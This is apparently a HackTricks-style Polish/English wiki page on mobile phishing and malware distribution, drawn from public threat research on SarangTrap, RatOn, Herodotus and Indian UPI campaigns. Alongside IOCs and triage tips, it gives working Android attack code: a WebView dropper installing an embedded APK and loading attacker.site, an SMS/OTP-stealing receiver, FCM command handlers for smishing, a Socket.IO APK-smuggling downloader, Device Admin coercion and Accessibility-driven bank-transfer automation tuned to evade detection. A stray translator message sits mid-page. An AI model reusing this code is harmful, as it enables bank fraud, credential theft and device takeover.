# Mobile Phishing i dystrybucja złośliwych aplikacji (Android & iOS)

{{#include ../../banners/hacktricks-training.md}}

> [!INFO]
> Ta strona opisuje techniki używane przez aktorów zagrożeń do dystrybucji **malicious Android APKs** oraz **iOS mobile-configuration profiles** poprzez phishing (SEO, social engineering, fake stores, dating apps, itd.).
> Materiał jest zaadaptowany z kampanii SarangTrap ujawnionej przez Zimperium zLabs (2025) oraz innych publicznych badań.

## Przebieg ataku

1. **SEO/Phishing Infrastructure**
* Zarejestruj dziesiątki podobnych domen (dating, cloud share, car service…).
– Używaj lokalnych słów kluczowych i emoji w elemencie `<title>`, aby lepiej pozycjonować się w Google.
– Hostuj *oba* zestawy instrukcji instalacji dla Android (`.apk`) i iOS na tej samej stronie docelowej.
2. **Pierwsze pobranie**
* Android: bezpośredni link do *unsigned* lub „third-party store” APK.
* iOS: `itms-services://` lub zwykły HTTPS link do złośliwego **mobileconfig** profile (patrz niżej).
3. **Po instalacji — social engineering**
* Przy pierwszym uruchomieniu aplikacja prosi o **invitation / verification code** (iluzja ekskluzywnego dostępu).
* Kod jest **POSTed over HTTP** do Command-and-Control (C2).
* C2 odpowiada `{"success":true}` ➜ malware kontynuuje działanie.
* Sandbox / AV dynamic analysis, które nigdy nie przesyła prawidłowego kodu, nie widzi **żadnych złośliwych zachowań** (evasion).
4. **Nadużywanie uprawnień w czasie wykonania** (Android)
* Niebezpieczne uprawnienia są żądane dopiero **po pozytywnej odpowiedzi z C2**:
```xml
<uses-permission android:name="android.permission.READ_CONTACTS"/>
<uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
<uses-permission android:name="android.permission.READ_PHONE_STATE"/>
<!-- Older builds also asked for SMS permissions -->
```
* Nowsze warianty **usuwają `<uses-permission>` dla SMS z `AndroidManifest.xml`**, ale pozostawiają ścieżkę w Java/Kotlin, która odczytuje SMS przez reflection ⇒ obniża wynik statyczny, jednocześnie działając na urządzeniach, które przyznają uprawnienie poprzez nadużycie `AppOps` lub stare cele.
5. **Android 13+ Restricted settings & Dropper Bypass (SecuriDropper‑style)**
* Android 13 wprowadził **Restricted settings** dla aplikacji instalowanych spoza sklepu: przełączniki Accessibility i Notification Listener są wyszarzone, dopóki użytkownik nie zezwoli wyraźnie na restricted settings w **App info**.
* Strony phishingowe i droppery dostarczają teraz instrukcje krok po kroku w UI, jak **zezwolić na restricted settings** dla sideloaded app, a następnie włączyć dostęp Accessibility/Notification.
* Nowsze obejście polega na zainstalowaniu ładunku za pomocą **session‑based PackageInstaller flow** (tej samej metody, której używają app stores). Android traktuje aplikację jak zainstalowaną ze sklepu, więc Restricted settings przestaje blokować Accessibility.
* Wskazówka do triage: w dropperze grepować `PackageInstaller.createSession/openSession` wraz z kodem, który natychmiast nawiguję ofiarę do `ACTION_ACCESSIBILITY_SETTINGS` lub `ACTION_NOTIFICATION_LISTENER_SETTINGS`.
6. **Facade UI & zbieranie w tle**
* Aplikacja pokazuje nieszkodliwe widoki (SMS viewer, gallery picker) zaimplementowane lokalnie.
* W międzyczasie eksfiltrowane są:
- IMEI / IMSI, numer telefonu
- Pełny zrzut `ContactsContract` (tablica JSON)
- JPEG/PNG z `/sdcard/DCIM` skompresowane za pomocą [Luban](https://github.com/Curzibn/Luban) w celu zmniejszenia rozmiaru
- Opcjonalna treść SMS (`content://sms`)
Payloady są **batch-zipped** i wysyłane przez `HTTP POST /upload.php`.
7. **Technika dostarczenia iOS**
* Jeden **mobile-configuration profile** może żądać `PayloadType=com.apple.sharedlicenses`, `com.apple.managedConfiguration` itp., aby zapisać urządzenie w nadzorowaniu podobnym do “MDM”.
* Instrukcje social-engineeringowe:
1. Otwórz Settings ➜ *Profile downloaded*.
2. Stuknij *Install* trzy razy (zrzuty ekranu na stronie phishingowej).
3. Zaufaj niesygnowanemu profilowi ➜ atakujący uzyskuje entitlements *Contacts* & *Photo* bez przeglądu App Store.
8. **iOS Web Clip Payload (phishing app icon)**
* `com.apple.webClip.managed` payloady mogą **przypiąć phishingowy URL do Home Screen** z brandowaną ikoną/etykietą.
* Web Clips mogą działać **w trybie pełnoekranowym** (ukrywają UI przeglądarki) i mogą być oznaczone jako **non‑removable**, zmuszając ofiarę do usunięcia profilu, aby usunąć ikonę.
9. **Warstwa sieciowa**
* Zwykły HTTP, często na porcie 80 z HOST header typu `api.<phishingdomain>.com`.
* `User-Agent: Dalvik/2.1.0 (Linux; U; Android 13; Pixel 6 Build/TQ3A.230805.001)` (brak TLS → łatwe do wykrycia).

## Wskazówki dla Red Teamu

* **Dynamic Analysis Bypass** – podczas oceny malware zautomatyzuj fazę podawania invitation code przy użyciu Frida/Objection, aby dotrzeć do złośliwej gałęzi.
* **Manifest vs. Runtime Diff** – porównaj `aapt dump permissions` z runtime `PackageManager#getRequestedPermissions()`; brakujące niebezpieczne perms to sygnał ostrzegawczy.
* **Network Canary** – skonfiguruj `iptables -p tcp --dport 80 -j NFQUEUE`, aby wykrywać niestabilne serie POST po wpisaniu kodu.
* **mobileconfig Inspection** – użyj `security cms -D -i profile.mobileconfig` na macOS, aby wylistować `PayloadContent` i wykryć nadmierne entitlements.

## Przydatny fragment Frida: automatyczne obejście kodu zaproszenia

<details>
<summary>Frida: auto-bypass invitation code</summary>
```javascript
// frida -U -f com.badapp.android -l bypass.js --no-pause
// Hook HttpURLConnection write to always return success
Java.perform(function() {
var URL = Java.use('java.net.URL');
URL.openConnection.implementation = function() {
var conn = this.openConnection();
var HttpURLConnection = Java.use('java.net.HttpURLConnection');
if (Java.cast(conn, HttpURLConnection)) {
conn.getResponseCode.implementation = function(){ return 200; };
conn.getInputStream.implementation = function(){
return Java.use('java.io.ByteArrayInputStream').$new("{\"success\":true}".getBytes());
};
}
return conn;
};
});
```
</details>

## Wskaźniki (ogólne)
```
/req/checkCode.php        # invite code validation
/upload.php               # batched ZIP exfiltration
LubanCompress 1.1.8       # "Luban" string inside classes.dex
```
---

## Android WebView Payment Phishing (UPI) – Dropper + FCM C2 Pattern

This pattern has been observed in campaigns abusing government-benefit themes to steal Indian UPI credentials and OTPs. Operators chain reputable platforms for delivery and resilience.

### Delivery chain across trusted platforms
- YouTube video lure → description contains a short link
- Shortlink → GitHub Pages phishing site imitating the legit portal
- Same GitHub repo hosts an APK with a fake “Google Play” badge linking directly to the file
- Dynamic phishing pages live on Replit; remote command channel uses Firebase Cloud Messaging (FCM)

### Dropper with embedded payload and offline install
- First APK is an installer (dropper) that ships the real malware at `assets/app.apk` and prompts the user to disable Wi‑Fi/mobile data to blunt cloud detection.
- The embedded payload installs under an innocuous label (e.g., “Secure Update”). After install, both the installer and the payload are present as separate apps.

Static triage tip (grep for embedded payloads):
```bash
unzip -l sample.apk | grep -i "assets/app.apk"
# Or:
zipgrep -i "classes|.apk" sample.apk | head
```
### Dynamic endpoint discovery via shortlink
- Malware pobiera z shortlinka listę aktywnych endpointów w postaci plain-text, rozdzieloną przecinkami; proste przekształcenia ciągów znaków generują końcową ścieżkę strony phishing.

Przykład (ocenzurowany):
```
GET https://rebrand.ly/dclinkto2
Response: https://sqcepo.replit.app/gate.html,https://sqcepo.replit.app/addsm.php
Transform: "gate.html" → "gate.htm" (loaded in WebView)
UPI credential POST: https://sqcepo.replit.app/addup.php
SMS upload:           https://sqcepo.replit.app/addsm.php
```
Pseudokod:
```java
String csv = httpGet(shortlink);
String[] parts = csv.split(",");
String upiPage = parts[0].replace("gate.html", "gate.htm");
String smsPost = parts[1];
String credsPost = upiPage.replace("gate.htm", "addup.php");
```
### Zbieranie poświadczeń UPI oparte na WebView
- Krok “Make payment of ₹1 / UPI‑Lite” ładuje atakujący formularz HTML z dynamicznego endpointu wewnątrz WebView i przechwytuje pola wrażliwe (numer telefonu, bank, UPI PIN), które są `POST`owane do `addup.php`.

Minimalny loader:
```java
WebView wv = findViewById(R.id.web);
wv.getSettings().setJavaScriptEnabled(true);
wv.loadUrl(upiPage); // ex: https://<replit-app>/gate.htm
```
### Samorozprzestrzenianie się i przechwytywanie SMS/OTP
- Podczas pierwszego uruchomienia żądane są agresywne uprawnienia:
```xml
<uses-permission android:name="android.permission.READ_CONTACTS"/>
<uses-permission android:name="android.permission.SEND_SMS"/>
<uses-permission android:name="android.permission.READ_SMS"/>
<uses-permission android:name="android.permission.CALL_PHONE"/>
```
- Kontakty są iterowane, by masowo wysyłać smishing SMS-y z urządzenia ofiary.
- Przychodzące SMS-y są przechwytywane przez broadcast receiver i przesyłane wraz z metadanymi (nadawca, treść, SIM slot, losowe ID przypisane do urządzenia) do `/addsm.php`.

Szkic odbiornika:
```java
public void onReceive(Context c, Intent i){
SmsMessage[] msgs = Telephony.Sms.Intents.getMessagesFromIntent(i);
for (SmsMessage m: msgs){
postForm(urlAddSms, new FormBody.Builder()
.add("senderNum", m.getOriginatingAddress())
.add("Message", m.getMessageBody())
.add("Slot", String.valueOf(getSimSlot(i)))
.add("Device rand", getOrMakeDeviceRand(c))
.build());
}
}
```
### Firebase Cloud Messaging (FCM) jako odporny C2
- Payload rejestruje się w FCM; wiadomości push zawierają pole `_type` używane jako przełącznik do wywoływania akcji (np. aktualizacja szablonów tekstów phishing, przełączanie zachowań).

Przykładowy FCM payload:
```json
{
"to": "<device_fcm_token>",
"data": {
"_type": "update_texts",
"template": "New subsidy message..."
}
}
```
Szkic handlera:
```java
@Override
public void onMessageReceived(RemoteMessage msg){
String t = msg.getData().get("_type");
switch (t){
case "update_texts": applyTemplate(msg.getData().get("template")); break;
case "smish": sendSmishToContacts(); break;
// ... more remote actions
}
}
```
### Wskaźniki/IOCs
- APK zawiera sekundarny payload w `assets/app.apk`
- WebView ładuje stronę płatności z `gate.htm` i exfiltrates do `/addup.php`
- SMS exfiltration do `/addsm.php`
- Shortlink-driven config fetch (np. `rebrand.ly/*`) zwracający CSV endpoints
- Aplikacje oznaczone jako ogólne „Update/Secure Update”
- FCM `data` messages z dyskryminatorem `_type` w nieufnych aplikacjach

---

## Socket.IO/WebSocket-based APK Smuggling + Fake Google Play Pages

Atakujący coraz częściej zastępują statyczne linki APK kanałem Socket.IO/WebSocket osadzonym w wabikach przypominających Google Play. To ukrywa payload URL, omija filtry URL/extension i zachowuje realistyczny UX instalacji.

Typowy przebieg klienta obserwowany w praktyce:

<details>
<summary>Socket.IO fałszywy downloader Play (JavaScript)</summary>
```javascript
// Open Socket.IO channel and request payload
const socket = io("wss://<lure-domain>/ws", { transports: ["websocket"] });
socket.emit("startDownload", { app: "com.example.app" });

// Accumulate binary chunks and drive fake Play progress UI
const chunks = [];
socket.on("chunk", (chunk) => chunks.push(chunk));
socket.on("downloadProgress", (p) => updateProgressBar(p));

// Assemble APK client‑side and trigger browser save dialog
socket.on("downloadComplete", () => {
const blob = new Blob(chunks, { type: "application/vnd.android.package-archive" });
const url = URL.createObjectURL(blob);
const a = document.createElement("a");
a.href = url; a.download = "app.apk"; a.style.display = "none";
document.body.appendChild(a); a.click();
});
```
</details>

Dlaczego omija proste zabezpieczenia:
- Nie ujawnia się statycznego URL do APK; payload jest rekonstruowany w pamięci z ramek WebSocket.
- Filtry URL/MIME/rozszerzeń blokujące bezpośrednie odpowiedzi .apk mogą nie wykryć danych binarnych tunelowanych przez WebSockets/Socket.IO.
- Crawlery i URL sandboxes, które nie wykonują WebSockets, nie pobiorą payloadu.

Zobacz też WebSocket tradecraft i tooling:

{{#ref}}
../../pentesting-web/websocket-attacks.md
{{#endref}}


## Android Accessibility/Overlay & Device Admin Abuse, ATS automation, and NFC relay orchestration – studium przypadku RatOn

Kampania RatOn banker/RAT (ThreatFabric) jest konkretnym przykładem tego, jak współczesne operacje phishingu mobilnego łączą WebView droppers, Accessibility-driven UI automation, overlays/ransom, Device Admin coercion, Automated Transfer System (ATS), przejęcie crypto wallet i nawet NFC-relay orchestration. W tej sekcji wyodrębniono techniki, które można ponownie użyć.

### Stage-1: WebView → most instalacji natywnej (dropper)

Atakujący wyświetlają WebView wskazujący na stronę atakującego i wstrzykują interfejs JavaScript ujawniający natywny instalator. Naciśnięcie przycisku HTML wywołuje kod natywny, który instaluje APK drugiego etapu dołączony w assets droppera, a następnie uruchamia go bezpośrednio.

Minimalny wzorzec:

<details>
<summary>Stage-1 dropper minimalny wzorzec (Java)</summary>
```java
public class DropperActivity extends Activity {
@Override protected void onCreate(Bundle b){
super.onCreate(b);
WebView wv = new WebView(this);
wv.getSettings().setJavaScriptEnabled(true);
wv.addJavascriptInterface(new Object(){
@android.webkit.JavascriptInterface
public void installApk(){
try {
PackageInstaller pi = getPackageManager().getPackageInstaller();
PackageInstaller.SessionParams p = new PackageInstaller.SessionParams(PackageInstaller.SessionParams.MODE_FULL_INSTALL);
int id = pi.createSession(p);
try (PackageInstaller.Session s = pi.openSession(id);
InputStream in = getAssets().open("payload.apk");
OutputStream out = s.openWrite("base.apk", 0, -1)){
byte[] buf = new byte[8192]; int r; while((r=in.read(buf))>0){ out.write(buf,0,r);} s.fsync(out);
}
PendingIntent status = PendingIntent.getBroadcast(this, 0, new Intent("com.evil.INSTALL_DONE"), PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE);
pi.commit(id, status.getIntentSender());
} catch (Exception e) { /* log */ }
}
}, "bridge");
setContentView(wv);
wv.loadUrl("https://attacker.site/install.html");
}
}
```
Proszę wklej pełną zawartość pliku lub sekcję do przetłumaczenia — obecnie otrzymałem tylko "</details>" i "HTML on the page:". Po otrzymaniu tekstu przetłumaczę go na polski zachowując dokładnie oryginalne tagi, linki i ścieżki.
```html
<button onclick="bridge.installApk()">Install</button>
```
Po instalacji dropper uruchamia payload poprzez explicit package/activity:
```java
Intent i = new Intent();
i.setClassName("com.stage2.core", "com.stage2.core.MainActivity");
startActivity(i);
```
Pomysł na wykrywanie: nieufne aplikacje wywołujące `addJavascriptInterface()` i ujawniające metody przypominające installer dla WebView; APK zawierające osadzony dodatkowy payload w `assets/` i wywołujące Package Installer Session API.

### Lejek zgody: Accessibility + Device Admin + follow-on runtime prompts
Stage-2 otwiera WebView, który hostuje stronę “Access”. Jej przycisk wywołuje eksportowaną metodę, która przekierowuje ofiarę do ustawień Accessibility i prosi o włączenie złośliwej usługi. Po przyznaniu, malware wykorzystuje Accessibility do automatycznego klikania kolejnych dialogów uprawnień runtime (contacts, overlay, manage system settings, itd.) oraz żąda Device Admin.

- Accessibility programowo pomaga zaakceptować późniejsze monity, wyszukując przyciski takie jak “Allow”/“OK” w drzewie węzłów i wywołując kliknięcia.
- Overlay permission check/request:
```java
if (!Settings.canDrawOverlays(ctx)) {
Intent i = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
Uri.parse("package:" + ctx.getPackageName()));
ctx.startActivity(i);
}
```
Zobacz też:

{{#ref}}
../../mobile-pentesting/android-app-pentesting/accessibility-services-abuse.md
{{#endref}}

### Overlay phishing/ransom via WebView
Operatorzy mogą wysyłać polecenia, aby:
- wyświetlić full-screen overlay z URL, lub
- przekazać inline HTML, które jest ładowane do overlayu WebView.

Prawdopodobne zastosowania: wymuszenie (wprowadzanie PIN), otwarcie wallet w celu przechwycenia PIN-ów, komunikaty o żądaniu okupu. Zachowaj polecenie, które upewnia się, że uprawnienie overlay jest przyznane, jeśli go brakuje.

### Remote control model – text pseudo-screen + screen-cast
- Low-bandwidth: okresowo zrzucać Accessibility node tree, serializować widoczne teksty/role/bounds i wysyłać do C2 jako pseudo-ekran (polecenia takie jak `txt_screen` jednorazowo i `screen_live` ciągłe).
- High-fidelity: żądać MediaProjection i uruchamiać screen-casting/recording na żądanie (polecenia typu `display` / `record`).

### ATS playbook (bank app automation)
Mając zadanie w formacie JSON, otwórz aplikację bankową, steruj UI przez Accessibility mieszanką zapytań tekstowych i tapnięć po współrzędnych, oraz wprowadź payment PIN ofiary, gdy zostanie wyświetlony.

Przykładowe zadanie:
```json
{
"cmd": "transfer",
"receiver_address": "ACME s.r.o.",
"account": "123456789/0100",
"amount": "24500.00",
"name": "ACME"
}
```
Example texts seen in one target flow (CZ → EN):
- "Nová platba" → "Nowa płatność"
- "Zadat platbu" → "Wprowadź płatność"
- "Nový příjemce" → "Nowy odbiorca"
- "Domácí číslo účtu" → "Numer konta krajowego"
- "Další" → "Dalej"
- "Odeslat" → "Wyślij"
- "Ano, pokračovat" → "Tak, kontynuuj"
- "Zaplatit" → "Zapłać"
- "Hotovo" → "Gotowe"

Operatorzy mogą również sprawdzać/podnosić limity przelewów za pomocą poleceń takich jak `check_limit` i `limit`, które w podobny sposób nawigują po limits UI.

### Crypto wallet seed extraction
Cele to m.in. MetaMask, Trust Wallet, Blockchain.com, Phantom. Przebieg: odblokowanie (skradziony PIN lub podane hasło), przejście do Security/Recovery, ujawnienie/wyświetlenie seed phrase, keylog/exfiltrate it. Zaimplementować selektory uwzględniające locale (EN/RU/CZ/SK), aby ustabilizować nawigację w różnych językach.

### Device Admin coercion
Device Admin APIs są używane do zwiększenia możliwości przechwytywania PIN-ów i sprawienia problemów ofierze:

- Natychmiastowe zablokowanie:
```java
dpm.lockNow();
```
- Unieważnij bieżące credential, aby wymusić zmianę (Accessibility przechwytuje nowy PIN/password):
```java
dpm.setPasswordExpirationTimeout(admin, 1L); // requires admin / often owner
```
- Wymuś odblokowanie bez biometrii przez wyłączenie biometrycznych funkcji keyguard:
```java
dpm.setKeyguardDisabledFeatures(admin,
DevicePolicyManager.KEYGUARD_DISABLE_FINGERPRINT |
DevicePolicyManager.KEYGUARD_DISABLE_TRUST_AGENTS);
```
Uwaga: Wiele kontroli DevicePolicyManager wymaga Device Owner/Profile Owner na nowszych wersjach Android; niektóre buildy OEM mogą być mniej restrykcyjne. Zawsze weryfikuj na docelowym OS/OEM.

### Orkiestracja NFC relay (NFSkate)
Stage-3 może zainstalować i uruchomić zewnętrzny moduł NFC-relay (np. NFSkate) i nawet przekazać mu szablon HTML, aby poprowadzić ofiarę podczas relay. To umożliwia contactless card-present cash-out wraz z online ATS.

Background: [NFSkate NFC relay](https://www.threatfabric.com/blogs/ghost-tap-new-cash-out-tactic-with-nfc-relay).

### Zestaw poleceń operatora (przykład)
- UI/state: `txt_screen`, `screen_live`, `display`, `record`
- Social: `send_push`, `Facebook`, `WhatsApp`
- Overlays: `overlay` (inline HTML), `block` (URL), `block_off`, `access_tint`
- Wallets: `metamask`, `trust`, `blockchain`, `phantom`
- ATS: `transfer`, `check_limit`, `limit`
- Device: `lock`, `expire_password`, `disable_keyguard`, `home`, `back`, `recents`, `power`, `touch`, `swipe`, `keypad`, `tint`, `sound_mode`, `set_sound`
- Comms/Recon: `update_device`, `send_sms`, `replace_buffer`, `get_name`, `add_contact`
- NFC: `nfs`, `nfs_inject`

### Anti-detekcja ATS wykorzystująca Accessibility: ludzka kadencja tekstu i podwójna injekcja tekstu (Herodotus)

Aktorzy zagrażający coraz częściej łączą automatyzację opartą na Accessibility z mechanizmami anty-detekcji dostrojonymi przeciwko podstawowym biometrykom zachowań. Ostatni banker/RAT pokazuje dwa komplementarne tryby dostarczania tekstu oraz przełącznik operatora do symulacji ludzkiego pisania z losową kadencją.

- Discovery mode: enumeruj widoczne node’y za pomocą selektorów i bounds, aby precyzyjnie targetować inputy (ID, text, contentDescription, hint, bounds) przed działaniem.
- Dual text injection:
  - Mode 1 – `ACTION_SET_TEXT` bezpośrednio na docelowym node (stabilne, bez klawiatury);
  - Mode 2 – ustawienie schowka + `ACTION_PASTE` do fokusowanego node (działa, gdy bezpośrednie setText jest zablokowane).
- Human-like cadence: podziel ciąg dostarczony przez operatora i wprowadzaj go znak-po-znaku z losowymi opóźnieniami 300–3000 ms między zdarzeniami, aby ominąć heurystyki „machine-speed typing”. Zaimplementowane albo przez stopniowe powiększanie wartości za pomocą `ACTION_SET_TEXT`, albo przez wklejanie po jednym znaku.

<details>
<summary>Szkic Java: wykrywanie węzłów + opóźnione wprowadzanie znak-po-znaku przez setText lub clipboard+paste</summary>
```java
// Enumerate nodes (HVNCA11Y-like): text, id, desc, hint, bounds
void discover(AccessibilityNodeInfo r, List<String> out){
if (r==null) return; Rect b=new Rect(); r.getBoundsInScreen(b);
CharSequence id=r.getViewIdResourceName(), txt=r.getText(), cd=r.getContentDescription();
out.add(String.format("cls=%s id=%s txt=%s desc=%s b=%s",
r.getClassName(), id, txt, cd, b.toShortString()));
for(int i=0;i<r.getChildCount();i++) discover(r.getChild(i), out);
}

// Mode 1: progressively set text with randomized 300–3000 ms delays
void sendTextSetText(AccessibilityNodeInfo field, String s) throws InterruptedException{
String cur = "";
for (char c: s.toCharArray()){
cur += c; Bundle b=new Bundle();
b.putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, cur);
field.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, b);
Thread.sleep(300 + new java.util.Random().nextInt(2701));
}
}

// Mode 2: clipboard + paste per-char with randomized delays
void sendTextPaste(AccessibilityService svc, AccessibilityNodeInfo field, String s) throws InterruptedException{
field.performAction(AccessibilityNodeInfo.ACTION_FOCUS);
ClipboardManager cm=(ClipboardManager) svc.getSystemService(Context.CLIPBOARD_SERVICE);
for (char c: s.toCharArray()){
cm.setPrimaryClip(ClipData.newPlainText("x", Character.toString(c)));
field.performAction(AccessibilityNodeInfo.ACTION_PASTE);
Thread.sleep(300 + new java.util.Random().nextInt(2701));
}
}
```
</details>

Nakładki blokujące w celu ukrycia oszustwa:
- Wyświetl pełnoekranowy `TYPE_ACCESSIBILITY_OVERLAY` z przezroczystością kontrolowaną przez operatora; utrzymuj go nieprzezroczystym dla ofiary, podczas gdy zdalna automatyzacja działa pod spodem.
- Typowe polecenia: `opacityOverlay <0..255>`, `sendOverlayLoading <html/url>`, `removeOverlay`.

Minimalna nakładka z regulowaną wartością alpha:
```java
View v = makeOverlayView(ctx); v.setAlpha(0.92f); // 0..1
WindowManager.LayoutParams lp = new WindowManager.LayoutParams(
MATCH_PARENT, MATCH_PARENT,
WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY,
WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE |
WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL,
PixelFormat.TRANSLUCENT);
wm.addView(v, lp);
```
Często spotykane prymitywy sterowania operatora: `BACK`, `HOME`, `RECENTS`, `CLICKTXT`/`CLICKDESC`/`CLICKELEMENT`/`CLICKHINT`, `TAP`/`SWIPE`, `NOTIFICATIONS`, `OPNPKG`, `VNC`/`VNCA11Y` (screen sharing).

## Źródła

- [New Android Malware Herodotus Mimics Human Behaviour to Evade Detection](https://www.threatfabric.com/blogs/new-android-malware-herodotus-mimics-human-behaviour-to-evade-detection)

- [The Dark Side of Romance: SarangTrap Extortion Campaign](https://zimperium.com/blog/the-dark-side-of-romance-sarangtrap-extortion-campaign)
- [Luban – Android image compression library](https://github.com/Curzibn/Luban)
- [Android Malware Promises Energy Subsidy to Steal Financial Data (McAfee Labs)](https://www.mcafee.com/blogs/other-blogs/mcafee-labs/android-malware-promises-energy-subsidy-to-steal-financial-data/)
- [Firebase Cloud Messaging — Docs](https://firebase.google.com/docs/cloud-messaging)
- [The Rise of RatOn: From NFC heists to remote control and ATS (ThreatFabric)](https://www.threatfabric.com/blogs/the-rise-of-raton-from-nfc-heists-to-remote-control-and-ats)
- [GhostTap/NFSkate – NFC relay cash-out tactic (ThreatFabric)](https://www.threatfabric.com/blogs/ghost-tap-new-cash-out-tactic-with-nfc-relay)
- [Banker Trojan Targeting Indonesian and Vietnamese Android Users (DomainTools)](https://dti.domaintools.com/banker-trojan-targeting-indonesian-and-vietnamese-android-users/)
- [DomainTools SecuritySnacks – ID/VN Banker Trojans (IOCs)](https://github.com/DomainTools/SecuritySnacks/blob/main/2025/BankerTrojan-ID-VN)
- [Socket.IO](https://socket.io)
- [Bypassing Android 13 Restrictions with SecuriDropper (ThreatFabric)](https://www.threatfabric.com/blogs/droppers-bypassing-android-13-restrictions)
- [Web Clips payload settings for Apple devices](https://support.apple.com/guide/deployment/web-clips-payload-settings-depbc7c7808/web)

{{#include ../../banners/hacktricks-training.md}}
